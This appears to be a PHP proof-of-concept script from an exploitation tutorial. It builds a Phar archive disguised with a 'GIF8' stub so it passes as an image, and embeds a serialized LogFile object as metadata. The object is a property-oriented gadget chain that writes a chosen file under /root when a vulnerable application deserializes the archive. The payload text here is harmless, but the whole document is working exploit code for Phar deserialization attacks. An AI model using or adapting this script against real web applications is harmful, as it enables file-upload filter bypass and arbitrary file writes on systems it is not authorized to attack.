<?php
// Create the POP Chain 
class LogFile
{
    public function __construct () {
        $this->filename = '/root/pleasesubscribe.txt';
        $this->fcontents = 'And support me on patreon';
    }
}
// Create the Phar Archive
$phar = new \Phar("test.phar");
$phar->startBuffering();
$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");
// Begin of serialization
$payload = new LogFile();
$phar->setMetadata($payload);
// Zip file within the Phar Archive 
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
?>